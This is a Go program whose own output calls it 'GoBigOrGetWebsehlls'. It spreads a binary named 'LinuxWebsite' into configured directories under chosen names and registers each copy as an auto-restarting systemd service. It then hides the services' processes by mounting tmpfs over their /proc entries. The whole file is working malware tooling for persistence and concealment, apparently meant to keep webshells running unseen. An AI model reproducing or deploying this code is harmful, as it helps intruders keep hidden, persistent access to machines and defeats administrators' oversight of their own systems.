package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
)

// Config struct to hold configuration data
type Config struct {
	Directory   string
	Port        string
	Name        string
	ServiceName string
}

// ReadConfig reads the config file and returns a slice of Config structs
func ReadConfig(filename string) ([]Config, error) {
	var configs []Config

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		values := strings.Split(line, ",")
		config := Config{
			Directory:   values[0],
			Port:        values[1],
			Name:        values[2],
			ServiceName: values[3],
		}
		configs = append(configs, config)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return configs, nil
}

// PrimeVariables primes the variables for the rest of the functions
func PrimeVariables(filename string) ([]Config, error) {
	return ReadConfig(filename)
}

// DistributionFunction copies a file named "LinuxWebsite" to all directories in the config file
func DistributionFunction(configs []Config) {
	sourceFile := "LinuxWebsite"
	successfulCopies := 0

	for _, config := range configs {
		destination := config.Directory + "/" + sourceFile

		// Create the destination directory if it doesn't exist
		if _, err := os.Stat(config.Directory); os.IsNotExist(err) {
			err := os.MkdirAll(config.Directory, 0755)
			if err != nil {
				fmt.Println("Error creating destination directory:", err)
				continue
			}
		}

		// Open the source file for reading
		source, err := os.Open(sourceFile)
		if err != nil {
			fmt.Println("Error opening source file:", err)
			continue
		}
		defer source.Close()

		// Create the destination file
		dest, err := os.Create(destination)
		if err != nil {
			fmt.Println("Error creating destination file:", err)
			continue
		}
		defer dest.Close()

		// Copy the contents of the source file to the destination file
		_, err = io.Copy(dest, source)
		if err != nil {
			fmt.Printf("Error copying file to %s: %v\n", destination, err)
			continue
		}

		// Set execution permissions on the destination file
		err = dest.Chmod(0755)
		if err != nil {
			fmt.Printf("Error setting execution permissions for %s: %v\n", destination, err)
			continue
		}

		fmt.Printf("Successfully copied file to %s\n", destination)
		successfulCopies++
	}

	if successfulCopies == len(configs) {
		fmt.Println("All copies were successful.")
	} else {
		fmt.Printf("Some copies failed. Successfully copied %d out of %d files.\n", successfulCopies, len(configs))
	}
}

// RenamingFunction renames the LinuxWebsite files according to the config file
func RenamingFunction(configs []Config) {
	for _, config := range configs {
		oldName := config.Directory + "/LinuxWebsite"
		newName := config.Directory + "/" + config.Name

		// Rename file
		err := os.Rename(oldName, newName)
		if err != nil {
			fmt.Printf("Error renaming file %s: %v\n", oldName, err)
		} else {
			fmt.Printf("Successfully renamed file from %s to %s\n", oldName, newName)
		}
	}

	fmt.Println("Renaming complete.")
}

// createSystemdService creates a systemd service file based on the provided configurations
func createSystemdService(configs []Config) error {
	for _, config := range configs {
		serviceContent := fmt.Sprintf(`[Unit]
Description=%s Website Service
After=network.target

[Service]
ExecStart=%s/%s %s
Restart=always

[Install]
WantedBy=multi-user.target
`, config.Name, config.Directory, config.Name, config.Port)

		serviceFilePath := fmt.Sprintf("/etc/systemd/system/%s.service", config.ServiceName)
		err := os.WriteFile(serviceFilePath, []byte(serviceContent), 0644)
		if err != nil {
			return err
		}

		fmt.Printf("Created systemd service file: %s\n", serviceFilePath)
		fmt.Println("Systemd service started for", config.ServiceName)
	}
	return nil
}

func ensureEmptyPIDFile(fileName string) {
	// Check if the file exists
	if _, err := os.Stat(fileName); os.IsNotExist(err) {
		// File does not exist, create an empty file
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println("Error creating file:", err)
			return
		}
		defer file.Close()
		fmt.Printf("File %s created.\n", fileName)
	} else {
		// File exists, check if it's empty
		file, err := os.OpenFile(fileName, os.O_RDWR, os.ModePerm)
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer file.Close()

		// Check file size
		fileInfo, err := file.Stat()
		if err != nil {
			fmt.Println("Error getting file info:", err)
			return
		}

		if fileInfo.Size() > 0 {
			// File is not empty, truncate its content
			err := file.Truncate(0)
			if err != nil {
				fmt.Println("Error truncating file:", err)
				return
			}
			fmt.Printf("File %s cleared.\n", fileName)
		} else {
			// File is empty, do nothing
			fmt.Printf("File %s is empty, no action needed.\n", fileName)
		}
	}
}

func reloadSystemd() error {
	cmd := exec.Command("/usr/bin/systemctl", "daemon-reload")
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("error with reload: %v", err)
	}
	return nil
}

func enableAndStartServices(configs []Config) error {
	for _, config := range configs {
		cmd := exec.Command("/usr/bin/systemctl", "enable", config.ServiceName+".service")
		err := cmd.Run()
		if err != nil {
			return fmt.Errorf("error with enabling: %v", err)
		}

		cmd = exec.Command("/usr/bin/systemctl", "start", config.ServiceName+".service")
		err = cmd.Run()
		if err != nil {
			return fmt.Errorf("error with starting: %v", err)
		}
	}
	return nil
}

func main() {
	if len(os.Args) < 2 {
		printUsageAndExit()
	}

	option := os.Args[1]

	switch option {
	case "-all":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}

		DistributionFunction(configs)
		RenamingFunction(configs)
		createSystemdService(configs)
		reloadSystemd()
		enableAndStartServices(configs)
		ensureEmptyPIDFile("pid.txt")

		for _, config := range configs {
			cmd := exec.Command("bash", "-c", fmt.Sprintf("systemctl status %s.service | grep Main | awk '{print $3}' >> pid.txt", config.ServiceName))
			cmd.Run()
		}

		file, err := os.Open("pid.txt")
		if err != nil {
			fmt.Println("Error opening file:", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pid := scanner.Text()

			// Execute the command for each PID
			cmd := exec.Command("sh", "-c", fmt.Sprintf(`mount -t tmpfs none /proc/%s`, pid))
			err := cmd.Run()
			if err != nil {
				fmt.Printf("Error hiding PID %s: %v\n", pid, err)
			} else {
				fmt.Printf("Successfully hid PID %s\n", pid)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading file:", err)
		}

		fmt.Printf("\nGoBigOrGetWebsehlls has successfully run\n")
	
	case "-ldist":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		DistributionFunction(configs)
	
	case "-lname":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		RenamingFunction(configs)

	case "-lcreates":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		createSystemdService(configs)
		reloadSystemd()

	case "-lstart":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		reloadSystemd()
		enableAndStartServices(configs)

	case "-lhide":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		ensureEmptyPIDFile("pid.txt")
		for _, config := range configs {
			cmd := exec.Command("bash", "-c", fmt.Sprintf("systemctl status %s.service | grep Main | awk '{print $3}' >> pid.txt", config.ServiceName))
			cmd.Run()
		}

		file, err := os.Open("pid.txt")
		if err != nil {
			fmt.Println("Error opening file:", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pid := scanner.Text()

			// Execute the command for each PID
			cmd := exec.Command("sh", "-c", fmt.Sprintf(`mount -t tmpfs none /proc/%s`, pid))
			err := cmd.Run()
			if err != nil {
				fmt.Printf("Error hiding PID %s: %v\n", pid, err)
			} else {
				fmt.Printf("Successfully hid PID %s\n", pid)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading file:", err)
		}

	default:
		fmt.Println("Invalid option.")
		printUsageAndExit()
	}
}

func printUsageAndExit() {
	fmt.Println("Usage:")
	fmt.Println("      -all      : Run all functions in order")
	fmt.Println("      -ldist    : Run distribution function")
	fmt.Println("      -lname    : Run renaming function")
	fmt.Println("      -lcreates : Run create systemd service and reload systemd")
	fmt.Println("      -lstart   : Reload systemd and enable/start services")
	fmt.Println("      -lhide    : Ensure empty PID file, update PID file, and hides PIDs")
	os.Exit(1)
}
